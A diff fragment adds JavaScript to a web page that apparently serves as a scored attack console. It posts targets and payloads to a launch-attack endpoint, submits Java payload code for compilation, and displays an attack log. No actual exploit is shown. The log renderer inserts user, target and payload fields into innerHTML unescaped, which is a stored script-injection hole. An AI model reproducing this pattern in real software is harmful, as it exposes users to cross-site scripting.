+        function launchAttack(){const target=document.getElementById('target').value;const payload=document.getElementById('attack-payload').value;fetch('/api/launch-attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,payload})}).then(r=>r.json()).then(data=>{setResult('attack-result',data.message||'Attack request sent.',data.status==='success');updateScore();refreshLog();}).catch(()=>setResult('attack-result','Attack request failed.',false))}
+        function compilePayload(){const code=document.getElementById('java-code').value;fetch('/api/compile-payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code})}).then(r=>r.json()).then(data=>{setResult('compile-result',data.message||'Compilation completed.',data.status==='success');updateScore();}).catch(()=>setResult('compile-result','Compilation request failed.',false))}
+        function refreshLog(){fetch('/api/attack-log').then(r=>r.json()).then(data=>{const log=document.getElementById('attack-log');if(!data.log||!data.log.length){log.innerHTML='<div class="console-line"><span class="time">[IDLE]</span><span>No attack events recorded yet.</span></div>';return;}log.innerHTML=data.log.slice().reverse().map(entry=>`<div class="console-line"><span class="time">[${entry.time}]</span><span>${entry.user} targeted ${entry.target}</span><div class="muted" style="margin-top:6px">${entry.payload}</div></div>`).join('');}).catch(()=>{})}
     </script>
 </body>
 </html>
